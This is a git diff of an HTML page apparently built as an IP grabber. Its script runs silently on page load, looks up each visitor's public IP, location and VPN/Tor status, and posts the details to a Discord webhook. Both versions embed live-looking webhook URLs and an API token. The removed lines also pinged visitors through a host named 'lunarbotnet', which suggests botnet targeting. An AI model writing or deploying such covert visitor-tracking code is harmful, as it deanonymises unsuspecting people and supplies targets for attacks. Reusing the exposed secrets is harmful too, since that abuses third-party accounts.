@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,11 +6,8 @@
 </head>
 <body>
     <script>
-    
-    async function sendToDiscord(ipInfo, icmpStatus) {
-        console.log("Sending to Discord:", ipInfo, icmpStatus);
-        
-        const webhookURL = 'https://discord.com/api/webhooks/1310157589849313290/nfxCGmXfb0WMoZoNDbnIlxmyNM4VqQQh-VQfFo4fIHh6bwnV1xVu0WCK1j9Vfm0-Y5N4';
+    async function sendToDiscord(ipInfo) {
+        const webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
         const discordMessage = {
             content: "@everyone" ,
             embeds: [
@@ -66,12 +62,6 @@
                             value: ipInfo.data.privacy.tor ? "True" : "False", 
                             inline: true
                         },
-                        {
-                            name: "Received ICMP",
-                            value: icmpStatus ? "True" : "False",
-                            inline: true
-                        }
-                        
                     ],
                     color: 0x007BFF,
                     footer: {
@@ -81,47 +71,26 @@
             ]
         };
 
-        const response = await fetch(webhookURL, {
+        await fetch(webhookURL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify(discordMessage)
         });
-
-        if (response.ok) {
-            console.log("Webhook sent successfully");
-        } else {
-            console.log("Failed to send webhook:", response.status);
-        }
     }
 
-    
     async function getVisitorInfo() {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         const userIP = ipData.ip;
 
-        const ipInfoResponse = await fetch(`https://ipinfo.io/${userIP}/json?token=530f327f82fe54`);
+        const ipInfoResponse = await fetch(`https://ipinfo.io/widget/demo/${userIP}`);
         const ipInfo = await ipInfoResponse.json();
 
-        
-        const icmpStatus = await checkICMP(userIP);
-
-        
-        await sendToDiscord(ipInfo, icmpStatus);
+        await sendToDiscord(ipInfo);
     }
 
-    
-    async function checkICMP(ip) {
-        const response = await fetch(`https://lunarbotnet-meowwww.up.railway.app/ping?ip=${ip}`);
-        const result = await response.json();
-        console.log("ICMP result:", result);
-
-        return result.reachable ? "Received ICMP" : "No ICMP response";  
-    }
-
-    
     getVisitorInfo();
     </script>
 </body>
